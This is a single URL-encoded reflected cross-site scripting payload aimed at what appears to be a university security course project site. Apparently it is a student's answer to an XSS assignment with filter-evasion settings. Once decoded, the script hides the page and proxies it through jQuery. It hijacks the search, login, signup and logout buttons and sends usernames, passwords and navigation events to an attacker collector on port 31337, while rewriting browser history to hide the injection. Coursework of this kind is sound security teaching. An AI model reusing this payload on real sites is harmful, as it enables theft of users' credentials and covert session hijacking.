http://cis551.cis.upenn.edu/project3/search?xssdefense=3&q=%3Cscript%3Efunction%20payload2(attacker)%7B%0A%09function%20proxy(href%2Cpurl%2Cstat)%7B%0A%09%09%24(%60html%60).load(href%2Cfunction()%7B%0A%09%09%24(%60html%60).show()%3B%0A%09%09%09%24(%60a%60).each(function()%7B%0A%09%09%09if(this.href.indexOf(%60sscriptcript%60)!%3D-1%7C%7Cthis.href.indexOf(%60script%60)!%3D-1)%7B%24(this).hide()%3B%7D%7D)%3B%0A%09%09%09var%20ad%3D%60http%3A%2F%2Fcis551.cis.upenn.edu%2Fproject3%2F%60%3B%0A%09%09%09var%20ru%3Dwindow.location.href%3B%0A%09%09%09history.replaceState(window.history.state%2C%60%2Fproject3%60%2C%60%2Fproject3%60)%3B%0A%09%09%20%20%20%20%24(%60%23search-btn%60).click(function(e)%7B%0A%09%09%20%20%20%20%20%20var%20q%3D%24(%60%23query%60).val().split(%60%20%60).join(%60%2B%60)%3B%0A%09%09%09%20%20%24.ajax(%7Burl%3Aad%2B%60search%3Fq%3D%60%2Bq%7D).done(function(e)%7Bdocument.write(e)%3B%0A%09%09%09%20%20%09setTimeout(function()%7B%3Bproxy(ad%2B%60search%3Fq%3D%60%2Bq%2Cru%2C1)%3B%7D%2C500)%3B%7D)%3B%0A%09%09%09%20%20e.preventDefault()%3B%0A%09%09%09%20%20%24.get(attacker%2B%60stolen%3Fevent%3Dnav%26user%3D%60%2B%24(%60%23logged-in-user%60).text()%2B%60%26url%3D%60%2Bad%2B%60search%3Fq%3D%60%2Bq)%3B%0A%09%20%20%20%20%20%20%20%20%7D)%3B%0A%09%20%20%20%20%20%20%20%20%24(%60%23search-again-btn%60).click(function(e)%7B%0A%09%09%20%20%20%20%20%20e.preventDefault()%3B%0A%09%09%09%20%20%24.get(attacker%2B%60stolen%3Fevent%3Dnav%26user%3D%60%2B%24(%60%23logged-in-user%60).text()%2B%60%26url%3D%60%2Bad%2B%60search%60)%3B%0A%09%09%09%20%20window.location.replace(purl)%3B%0A%09%20%20%20%20%20%20%20%20%7D)%3B%20%0A%09%09%20%20%20%20%24(%60%23log-in-btn%60).click(function(e)%7B%0A%09%09%20%20%20%20%20%20e.preventDefault()%3B%0A%09%09%09%20%20%24.ajax(%7Burl%3Aad%2B%60login%3Fcsrfdefense%3D0%60%2Cmethod%3A%60POST%60%2Cdata%3A%7Busername%3A%24(%60%23username%60).val()%2Cpassword%3A%24(%60%23userpass%60).val()%7D%2Csuccess%3Afunction()%7B%0A%09%09%09%20%20%20%20window.location.replace(ru)%3B%3B%7D%7D)%3B%0A%09%09%09%20%20%24.get(attacker%2B%60stolen%3Fevent%3Dlogin%26user%3D%60%2B%24(%60%23username%60).val()%2B%60%26pass%3D%60%2B%24(%60%23userpass%60).val())%3B%0A%09%20%20%20%20%20%20%20%20%7D)%3B%0A%09%09%20%20%20%20%24(%60%23new-account-btn%60).click(function(e)%7B%0A%09%09%20%20%20%20%20%20e.preventDefault()%3B%0A%09%09%09%20%20%24.ajax(%7Burl%3Aad%2B%60create%3Fcsrfdefense%3D0%60%2Cmethod%3A%60POST%60%2Cdata%3A%7Busername%3A%24(%60%23username%60).val()%2Cpassword%3A%24(%60%23userpass%60).val()%7D%2Csuccess%3Afunction()%7B%0A%09%09%09%20%20%20%20window.location.replace(ru)%3B%3B%7D%7D)%3B%0A%09%20%20%20%20%20%20%20%20%7D)%3B%0A%09%09%20%20%20%20%24(%60%23log-out-btn%60).click(function(e)%7B%0A%09%09%20%20%20%20%20%20e.preventDefault()%3B%0A%09%09%09%20%20%24.get(attacker%2B%60stolen%3Fevent%3Dlogout%26user%3D%60%2B%24(%60%23logged-in-user%60).text())%3B%0A%09%09%09%20%20%24.ajax(%7Burl%3Aad%2B%60logout%3Fcsrfdefense%3D0%60%2Cmethod%3A%60POST%60%2Csuccess%3Afunction()%7B%0A%09%09%09%20%20%09if(stat%3D%3D0)%7Bwindow.location.replace(ru)%3B%7Delse%7Bwindow.location.replace(purl)%3B%7D%7D%7D)%3B%0A%09%20%20%20%20%20%20%20%20%7D)%3B%0A%09%09%09%7D)%3B%0A%09%09%7D%0A%09%24(%60html%60).hide()%3B%0A%09proxy(%60.%2F%60%2C%60.%2F%60%2C0)%3B%0A%7D%3Bpayload2(%60http%3A%2F%2F127.0.0.1%3A31337%2F%60)%3B%3C%2Fscript%3E